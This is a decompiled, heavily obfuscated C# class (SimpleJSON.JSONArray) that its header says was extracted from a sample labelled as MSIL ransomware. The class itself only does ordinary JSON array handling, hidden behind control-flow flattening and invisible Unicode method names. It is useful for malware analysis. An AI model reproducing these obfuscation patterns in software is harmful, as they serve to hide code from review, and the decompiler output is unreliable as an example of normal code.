// Decompiled with JetBrains decompiler
// Type: SimpleJSON.JSONArray
// Assembly: IOExcepti, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 72674A88-3F84-4927-9D84-82118D6CBF01
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-49811dca565bead069108819f9ad132a2214364381f97dcf7f0f439614cc8ff4.exe

using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace SimpleJSON
{
  public class JSONArray : JSONNode, IEnumerable
  {
    private List<JSONNode> m_List = new List<JSONNode>();

    public override JSONNode this[int aIndex]
    {
      get
      {
label_1:
        int num1 = 1877059947;
        JSONNode jsonNode;
        while (true)
        {
          uint num2;
          int num3;
          switch ((num2 = (uint) (num1 ^ 537521172)) % 8U)
          {
            case 0:
              num1 = (int) num2 * -212885403 ^ -1566797569;
              continue;
            case 1:
              jsonNode = (JSONNode) new JSONLazyCreator((JSONNode) this);
              num1 = (int) num2 * -1187967185 ^ -1698035157;
              continue;
            case 2:
              num1 = (int) num2 * -837266028 ^ 1436846375;
              continue;
            case 4:
              goto label_1;
            case 5:
              jsonNode = this.m_List[aIndex];
              num1 = 1680426422;
              continue;
            case 6:
              num3 = aIndex >= this.m_List.Count ? 1 : 0;
              break;
            case 7:
              if (aIndex >= 0)
              {
                num1 = (int) num2 * 435384950 ^ -224637496;
                continue;
              }
              num3 = 1;
              break;
            default:
              goto label_12;
          }
          int num4;
          num1 = num4 = num3 == 0 ? 773870345 : (num4 = 1759441333);
        }
label_12:
        return jsonNode;
      }
      set
      {
        if (aIndex < 0)
          goto label_5;
label_1:
        int num1 = 411150182;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 99169811)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              num1 = (int) num2 * -1725401371 ^ -1688332496;
              continue;
            case 3:
              this.m_List.Add(value);
              num1 = (int) num2 * 1130305496 ^ 590338828;
              continue;
            case 4:
              this.m_List[aIndex] = value;
              num1 = 193339863;
              continue;
            case 5:
              goto label_4;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:
        return;
label_4:
        int num3 = aIndex >= this.m_List.Count ? 1 : 0;
        goto label_6;
label_5:
        num3 = 1;
label_6:
        num1 = num3 == 0 ? 936969187 : (num1 = 1328138436);
        goto label_2;
      }
    }

    public override JSONNode this[string aKey]
    {
      get => (JSONNode) new JSONLazyCreator((JSONNode) this);
      set
      {
label_1:
        int num1 = -440354519;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1470980366)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 328399509 ^ 856773165;
              continue;
            case 2:
              goto label_3;
            case 3:
              this.m_List.Add(value);
              num1 = (int) num2 * 2124358708 ^ 1497290611;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public override int Count
    {
      get
      {
label_1:
        int num1 = -744151958;
        int count;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1008426872)) % 4U)
          {
            case 1:
              num1 = (int) num2 * 1892310472 ^ 823653472;
              continue;
            case 2:
              count = this.m_List.Count;
              num1 = (int) num2 * 1597329033 ^ -1330077825;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return count;
      }
    }

    public override void Add(string aKey, JSONNode aItem)
    {
      this.m_List.Add(aItem);
label_1:
      int num1 = 1357334111;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 167902128)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1533663717 ^ 258784032;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public override JSONNode Remove(int aIndex)
    {
label_1:
      int num1 = 2075669712;
      JSONNode jsonNode1;
      while (true)
      {
        uint num2;
        JSONNode jsonNode2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ 2030757668)) % 9U)
        {
          case 0:
            num1 = (int) num2 * -990097448 ^ 1594144133;
            continue;
          case 1:
            jsonNode2 = this.m_List[aIndex];
            num1 = 138876442;
            continue;
          case 2:
            int num4 = !flag ? -1400757422 : (num4 = -890707466);
            num1 = num4 ^ (int) num2 * -1596430119;
            continue;
          case 4:
            this.m_List.RemoveAt(aIndex);
            jsonNode1 = jsonNode2;
            num1 = (int) num2 * -424586211 ^ -1727568687;
            continue;
          case 5:
            if (aIndex >= 0)
            {
              num1 = (int) num2 * 224845994 ^ 1284567634;
              continue;
            }
            num3 = 1;
            break;
          case 6:
            num3 = aIndex >= this.m_List.Count ? 1 : 0;
            break;
          case 7:
            goto label_1;
          case 8:
            jsonNode1 = (JSONNode) null;
            num1 = (int) num2 * 1547420545 ^ -1468935868;
            continue;
          default:
            goto label_13;
        }
        flag = num3 != 0;
        num1 = 1043366583;
      }
label_13:
      return jsonNode1;
    }

    public override JSONNode Remove(JSONNode aNode)
    {
      this.m_List.Remove(aNode);
label_1:
      int num1 = -835160529;
      JSONNode jsonNode;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1548548096)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -129366820 ^ 1491348678;
            continue;
          case 3:
            jsonNode = aNode;
            num1 = (int) num2 * 2107962872 ^ -1869909723;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return jsonNode;
    }

    public override IEnumerable<JSONNode> Childs
    {
      get
      {
        bool childs;
        try
        {
          int num1 = this.\u003C\u003E1__state;
label_1:
          int num2 = -281835298;
          List<JSONNode>.Enumerator enumerator;
          JSONNode N;
          while (true)
          {
            uint num3;
            switch ((num3 = (uint) (num2 ^ -175255168)) % 23U)
            {
              case 0:
              case 12:
                this.\u003C\u003E1__state = -1;
                num2 = -1996217556;
                continue;
              case 1:
                num2 = (int) num3 * 123701700 ^ -1287323234;
                continue;
              case 2:
                int num4;
                num2 = num4 = num1 == 1 ? -1449446128 : (num4 = -669638317);
                continue;
              case 3:
              case 14:
                this.\u003C\u003E1__state = -3;
                N = (JSONNode) null;
                num2 = -477971970;
                continue;
              case 4:
                num2 = (int) num3 * 1371038045 ^ -1497790603;
                continue;
              case 5:
                num2 = (int) num3 * 885782162 ^ 684079077;
                continue;
              case 6:
                enumerator = this.m_List.GetEnumerator();
                this.\u003C\u003E1__state = -3;
                num2 = (int) num3 * -865537954 ^ 1827674152;
                continue;
              case 8:
                enumerator = new List<JSONNode>.Enumerator();
                num2 = (int) num3 * 1233284558 ^ -64706747;
                continue;
              case 9:
                childs = false;
                num2 = (int) num3 * 1524499918 ^ 1798246139;
                continue;
              case 10:
                this.\u003C\u003Em__Finally1();
                num2 = (int) num3 * -1954219729 ^ -1875647968;
                continue;
              case 13:
                int num5 = num1 == 0 ? 1085357769 : (num5 = 590630067);
                num2 = num5 ^ (int) num3 * 862992042;
                continue;
              case 16:
                N = enumerator.Current;
                this.\u003C\u003E2__current = N;
                num2 = -1077617133;
                continue;
              case 17:
                int num6;
                num2 = num6 = !enumerator.MoveNext() ? -1365829571 : (num6 = -243302681);
                continue;
              case 18:
                this.\u003C\u003E1__state = 1;
                childs = true;
                num2 = (int) num3 * -1176014355 ^ -288487645;
                continue;
              case 19:
                goto label_1;
              case 20:
                num2 = (int) num3 * -948421519 ^ 699078853;
                continue;
              case 21:
                childs = false;
                num2 = -1412452719;
                continue;
              case 22:
                num2 = (int) num3 * 1283305720 ^ 2000918197;
                continue;
              default:
                goto label_21;
            }
          }
        }
        __fault
        {
          this.System\u002EIDisposable\u002EDispose();
        }
label_21:
        return childs;
      }
    }

    public IEnumerator GetEnumerator()
    {
      bool enumerator1;
      // ISSUE: fault handler
      try
      {
        // ISSUE: reference to a compiler-generated field
        int num1 = this.\u003C\u003E1__state;
label_1:
        int num2 = 1246572050;
        List<JSONNode>.Enumerator enumerator;
        JSONNode N;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ 868664669)) % 24U)
          {
            case 0:
              num2 = (int) num3 * -1805366615 ^ -516233879;
              continue;
            case 1:
              enumerator1 = false;
              num2 = (int) num3 * 1285671148 ^ -1337415339;
              continue;
            case 2:
              goto label_16;
            case 3:
              num2 = (int) num3 * 581027733 ^ -1992060007;
              continue;
            case 5:
              enumerator = new List<JSONNode>.Enumerator();
              num2 = (int) num3 * 917126446 ^ -345471982;
              continue;
            case 6:
              // ISSUE: reference to a compiler-generated field
              this.\u003C\u003E1__state = 1;
              num2 = (int) num3 * 1329639382 ^ 286351923;
              continue;
            case 7:
              int num4 = num1 != 0 ? 425715089 : (num4 = 1751021892);
              num2 = num4 ^ (int) num3 * 576164453;
              continue;
            case 8:
              int num5;
              num2 = num5 = num1 == 1 ? 1148193287 : (num5 = 21259259);
              continue;
            case 9:
            case 10:
              // ISSUE: reference to a compiler-generated field
              this.\u003C\u003E1__state = -3;
              num2 = 664801342;
              continue;
            case 11:
              N = (JSONNode) null;
              num2 = (int) num3 * -1139677142 ^ 965575223;
              continue;
            case 12:
              int num6;
              num2 = num6 = enumerator.MoveNext() ? 1329551444 : (num6 = 1700109800);
              continue;
            case 13:
              // ISSUE: reference to a compiler-generated method
              this.\u003C\u003Em__Finally1();
              num2 = (int) num3 * 1427340323 ^ -1691331462;
              continue;
            case 14:
              num2 = (int) num3 * 362314591 ^ 1752653707;
              continue;
            case 15:
              num2 = (int) num3 * -742770489 ^ 2057483756;
              continue;
            case 16:
              num2 = (int) num3 * 924230374 ^ -980729856;
              continue;
            case 17:
              N = enumerator.Current;
              num2 = 2110729539;
              continue;
            case 18:
            case 23:
              // ISSUE: reference to a compiler-generated field
              this.\u003C\u003E1__state = -1;
              num2 = 69074542;
              continue;
            case 19:
              enumerator = this.m_List.GetEnumerator();
              // ISSUE: reference to a compiler-generated field
              this.\u003C\u003E1__state = -3;
              num2 = (int) num3 * -785962034 ^ -192443865;
              continue;
            case 20:
              goto label_18;
            case 21:
              goto label_1;
            case 22:
              // ISSUE: reference to a compiler-generated field
              this.\u003C\u003E2__current = (object) N;
              num2 = (int) num3 * -596511394 ^ 478626143;
              continue;
            default:
              goto label_24;
          }
        }
label_16:
        enumerator1 = true;
        goto label_24;
label_18:
        enumerator1 = false;
      }
      __fault
      {
        // ISSUE: reference to a compiler-generated method
        this.System\u002EIDisposable\u002EDispose();
      }
label_24:
      return enumerator1;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1907097580;
      string str1;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1066287923)) % 3U)
        {
          case 1:
            str1 = "[ ";
            num1 = (int) num2 * 2009027519 ^ 182098897;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      List<JSONNode>.Enumerator enumerator = this.m_List.GetEnumerator();
      try
      {
label_10:
        int num3 = !enumerator.MoveNext() ? 1624072173 : (num3 = 1564166172);
        JSONNode current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ 1066287923)) % 7U)
          {
            case 0:
              str1 = JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(str1, ", ");
              num3 = (int) num4 * -253147821 ^ 776417318;
              continue;
            case 1:
              int num5 = JSONArray.\u206C⁪⁯‪‏‫⁬​‭‏‎‬⁯⁪⁯‎⁬‮⁭‮‍⁮⁮⁮⁪‍⁮‎‌⁫‮‭‮‮‌‌⁬⁫‫⁪‮(str1) <= 2 ? 1142343913 : (num5 = 1356387110);
              num3 = num5 ^ (int) num4 * -491839996;
              continue;
            case 2:
              goto label_10;
            case 4:
              num3 = 1564166172;
              continue;
            case 5:
              current = enumerator.Current;
              num3 = 668120671;
              continue;
            case 6:
              str1 = JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(str1, JSONArray.\u202B‍‫‫‍⁬‌⁫‎‎​‏​⁮‮⁪‭‫‮⁮⁬⁯‬‏‫⁫⁬⁭‭⁭‪‫‫⁬⁪‏‮⁯⁭‌‮((object) current));
              num3 = 1303232447;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
label_14:
        int num6 = 439065916;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) (num6 ^ 1066287923)) % 3U)
          {
            case 1:
              num6 = (int) num7 * 1608950083 ^ 1091176870;
              continue;
            case 2:
              goto label_14;
            default:
              goto label_17;
          }
        }
label_17:;
      }
label_18:
      string str2 = JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(str1, " ]");
label_19:
      int num8 = 272133568;
      string str3;
      while (true)
      {
        uint num9;
        switch ((num9 = (uint) (num8 ^ 1066287923)) % 4U)
        {
          case 0:
            num8 = (int) num9 * 376645020 ^ 1354038306;
            continue;
          case 2:
            goto label_19;
          case 3:
            str3 = str2;
            num8 = (int) num9 * -655865303 ^ -773691572;
            continue;
          default:
            goto label_23;
        }
      }
label_23:
      return str3;
    }

    public override string ToString(string aPrefix)
    {
      string str1 = "[ ";
label_1:
      int num1 = 1420024093;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2008151412)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -944218612 ^ -1572526669;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      List<JSONNode>.Enumerator enumerator = this.m_List.GetEnumerator();
      try
      {
label_12:
        int num3 = !enumerator.MoveNext() ? 1314074560 : (num3 = 694745002);
        JSONNode current;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num3 ^ 2008151412)) % 7U)
          {
            case 1:
              str1 = JSONArray.\u200B‪‎⁮‪‭⁪‬‏‪⁮⁬⁬‭​‮‪‍​‪‪⁪‏⁮⁯‬‍‬⁪‫‫⁯‬‌⁪‫‏⁯‏‮(str1, "\n", aPrefix, "   ");
              str1 = JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(str1, current.ToString(JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(aPrefix, "   ")));
              num3 = 1708897236;
              continue;
            case 2:
              current = enumerator.Current;
              int num5;
              num3 = num5 = JSONArray.\u206C⁪⁯‪‏‫⁬​‭‏‎‬⁯⁪⁯‎⁬‮⁭‮‍⁮⁮⁮⁪‍⁮‎‌⁫‮‭‮‮‌‌⁬⁫‫⁪‮(str1) <= 3 ? 87686435 : (num5 = 730836742);
              continue;
            case 3:
              goto label_12;
            case 4:
              str1 = JSONArray.\u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮(str1, ", ");
              num3 = (int) num4 * 2107813403 ^ 118029093;
              continue;
            case 5:
              num3 = (int) num4 * -1495019183 ^ -1334297718;
              continue;
            case 6:
              num3 = 694745002;
              continue;
            default:
              goto label_18;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
label_14:
        int num6 = 1780975757;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) (num6 ^ 2008151412)) % 3U)
          {
            case 1:
              num6 = (int) num7 * 1459356607 ^ 882705367;
              continue;
            case 2:
              goto label_14;
            default:
              goto label_17;
          }
        }
label_17:;
      }
label_18:
      string str2 = JSONArray.\u200B‪‎⁮‪‭⁪‬‏‪⁮⁬⁬‭​‮‪‍​‪‪⁪‏⁮⁯‬‍‬⁪‫‫⁯‬‌⁪‫‏⁯‏‮(str1, "\n", aPrefix, "]");
label_19:
      int num8 = 1188250098;
      string str3;
      while (true)
      {
        uint num9;
        switch ((num9 = (uint) (num8 ^ 2008151412)) % 3U)
        {
          case 0:
            goto label_19;
          case 2:
            str3 = str2;
            num8 = (int) num9 * 1421094653 ^ 1181888913;
            continue;
          default:
            goto label_22;
        }
      }
label_22:
      return str3;
    }

    public override void Serialize(BinaryWriter aWriter)
    {
label_1:
      int num1 = -1244285499;
      int index;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -55211379)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            this.m_List[index].Serialize(aWriter);
            num1 = (int) num2 * 353213047 ^ -1840725269;
            continue;
          case 2:
            ++index;
            num1 = (int) num2 * -6814892 ^ 1146806540;
            continue;
          case 3:
            index = 0;
            num1 = (int) num2 * 1069941322 ^ 1322019778;
            continue;
          case 4:
            JSONArray.\u206E​⁯⁭‏‬​‭⁪⁬⁭⁯‪⁭⁬⁪‍‏‭⁯⁫⁬‪‬‮‪‎‭⁮‍‏‏‫‪⁭‪‌‍‫‍‮(aWriter, (byte) 1);
            JSONArray.\u206D⁫‮‌⁫‬⁯‌⁭⁬‌‬⁫⁭​‫‍‬‌​‪⁯⁭⁫⁫‬‫⁫​⁬⁬‭‎‌​⁬‍‭‫⁭‮(aWriter, this.m_List.Count);
            num1 = (int) num2 * 872402936 ^ -1886384798;
            continue;
          case 5:
            num1 = (int) num2 * -1526068210 ^ -346326076;
            continue;
          case 6:
            int num3 = !flag ? 2131277361 : (num3 = 1463594047);
            num1 = num3 ^ (int) num2 * 1220191187;
            continue;
          case 7:
            num1 = (int) num2 * 231405412 ^ 470811166;
            continue;
          case 8:
            num1 = -167477044;
            continue;
          case 9:
            flag = index < this.m_List.Count;
            num1 = -1624617717;
            continue;
          case 10:
            goto label_3;
          case 11:
            num1 = (int) num2 * -1487016274 ^ 790497569;
            continue;
          default:
            goto label_14;
        }
      }
label_3:
      return;
label_14:;
    }

    static int \u206C⁪⁯‪‏‫⁬​‭‏‎‬⁯⁪⁯‎⁬‮⁭‮‍⁮⁮⁮⁪‍⁮‎‌⁫‮‭‮‮‌‌⁬⁫‫⁪‮([In] string obj0) => obj0.Length;

    static string \u200F⁬‬⁭⁭⁯‬‮‎⁪⁪‎‌‮‍​‬‫⁬‮⁬‍‏‫‍‏​⁪‏‪‭‎⁯⁪‮‮​‮‏⁬‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202B‍‫‫‍⁬‌⁫‎‎​‏​⁮‮⁪‭‫‮⁮⁬⁯‬‏‫⁫⁬⁭‭⁭‪‫‫⁬⁪‏‮⁯⁭‌‮([In] object obj0) => obj0.ToString();

    static string \u200B‪‎⁮‪‭⁪‬‏‪⁮⁬⁬‭​‮‪‍​‪‪⁪‏⁮⁯‬‍‬⁪‫‫⁯‬‌⁪‫‏⁯‏‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3)
    {
      return obj0 + obj1 + obj2 + obj3;
    }

    static void \u206E​⁯⁭‏‬​‭⁪⁬⁭⁯‪⁭⁬⁪‍‏‭⁯⁫⁬‪‬‮‪‎‭⁮‍‏‏‫‪⁭‪‌‍‫‍‮([In] BinaryWriter obj0, [In] byte obj1) => obj0.Write(obj1);

    static void \u206D⁫‮‌⁫‬⁯‌⁭⁬‌‬⁫⁭​‫‍‬‌​‪⁯⁭⁫⁫‬‫⁫​⁬⁬‭‎‌​⁬‍‭‫⁭‮([In] BinaryWriter obj0, [In] int obj1) => obj0.Write(obj1);
  }
}
